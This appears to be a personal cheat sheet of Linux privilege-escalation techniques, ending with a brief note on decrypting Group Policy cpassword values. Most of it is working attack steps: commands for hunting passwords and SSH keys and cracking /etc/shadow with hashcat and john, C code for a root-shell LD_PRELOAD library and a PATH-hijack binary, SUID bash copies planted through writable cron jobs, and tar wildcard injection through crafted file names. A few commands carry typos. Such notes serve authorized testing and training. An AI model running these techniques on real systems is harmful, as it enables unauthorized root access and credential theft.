User enum

User folders
Whoami
Id
/etc/passwd/
Grep usernames - Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null

Password and sensitive file hunting
Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null
Locate password | more

History

Ls -la then cat .bash_history

Write contents of /etc/passwd and /etc/shadow to 2 diff files - then use tool called unshadow
unshadow passwordfile.txt shadowfile.txt > unshadowed.txt
(only works if access to shadow passwd) - ls -la /etc/shadow
Then crack with hashcat -hashcat -m 1800 unshadowex.txt wordlist.txt -O
Crack with John - john --wordlist=/home/kali/rockyou.txt hashname.txt

See if /etc/shadow is writeable - ls -la /etc/shadow
mkpasswd -m sha-512 yourpasswordhere

Finding SSH Keys
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

Should you find a rsa key - can get root shell with 2 commands
Copy rsa key to file on attacking machine
Run - chmod 400 rsakey
Run ssh -i rsakey username@ip

SUDO Priv Esc
see what a user has sudo rights too - sudo -l
should it ask for a sudo password - user has no sudo rights

Should stuff come up, take the names and search on gtfobins for sudo execution on the software

SUID
Type find / -type f -perm -04000 -ls 2>/dev/null to see what software has SUID set
use GTFO bins to look at software and see if any SUID exploits exist

Sudo LD_Preload
Sudo -l look for LD_PRELOAD at the top (pre loads a library)
Create a file 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

Save file as x.c
Type 
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
Type 
sudo LD_PRELOAD=/tmp/x.so service you can run as sudo with sudo -l
Type id


Shared Object Injection
find / -type f -perm -04000 -ls 2>/dev/null
Look for something we can inject (look at each path and see what each thing does, are they scripts?) Can use a tool called strace  ---- strace /location/to/path ---- have a look for errors such as missing files or directories
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
Create the directory / file and add malicious code


Capabilities
use command getcap to list capabilities - when run as unpriv user use getcap -r / 2>/dev/null
serach on GTFO bins for any capabilities with the software names discovered

Cron Jobs
Any user can read the file keeping system-wide cron jobs under /etc/crontab - cat /etc/crontab
Edit any cron jobs that have permission and replace with a reverse shell using nano filename then edit. Ensure it runs as root.



Means runs every minute
Overwrite file with output such as 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /file/path/ofcron.sh
chmod +x ofcron.sh
This will overwrite to tmp/bash and if you call /tmp/bash -p after the job has run it'll work

Also check systemd timers ---- systemctl list-timers --all

Cron Jobs with wildcard
Tar exploitation - when identifying cron jobs (cat /etc/crontab), there may be a job running using tar and a wildcard. You may have read only rights here.

E.g. A script contains this
cd important-directory
tar cf /var/backups/backup.tar *

First CD to the directory in the script
Add a malicious file --- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > output.sh
chmod +x output.sh
touch  /directory/of/script--checkpoint=1
touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh
/tmp/bash -p (have to wait for script to be run on timer)

Cron Jobs with overwrite
Check file perms of any cron jobs u find (ls -la filename.sh)
If write permissions can overwrite file
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> filename.sh

Path
find / -perm -u=s -exec ls -l {} \; 2>/dev/null
Look for non linux binaries

Or - find / -type f -perm -04000 -ls 2>/dev/null and look at binaries, run strings on the path -- strings /location/path and see if anything's interesting are there any system commands being called? If so see if you can write a new PATH - export PATH=      if yes;

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c (making new c file malicious service and writing it to the tmp folder)
2. In command prompt type: gcc /tmp/service.c -o /tmp/service   (outputting the file from C)
3. In command prompt type: export PATH=/tmp:$PATH  (creating new path variable)
4. In command prompt type: /usr/local/bin/suid-env   (this changes to whatever binary you identified)
5. In command prompt type: id

Another way
Repeat the find step ( - find / -type f -perm -04000 -ls 2>/dev/nul) and look at binary strings, if there is a system command being called with a direct service you could try create a new function as that service

E.g. If a binary has /usr/sbin/service apache 2 this shows it is reaching out to /usr/sbin to call the system command service. 
	1. Create a mew function with the path -- function /usr/sbin/service() {cp /bin/bash /tmp && chmpd +s /tmp/bash && /tmp/bash -p; }
	2. Export - ---- export -f /usr/sbin/service (ovbs change to the system command u find)
	3. Re -run the binary 


GPP Attacks
Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.
Download if accessible via SMB by authing to smb - using mget command - mget * to download all files
To decrypt cpassword - use tool call gpp-decrypt



![image](https://user-images.githubusercontent.com/35967437/200787298-1e975059-fbe5-4d8a-8313-674bb4e4e67b.png)
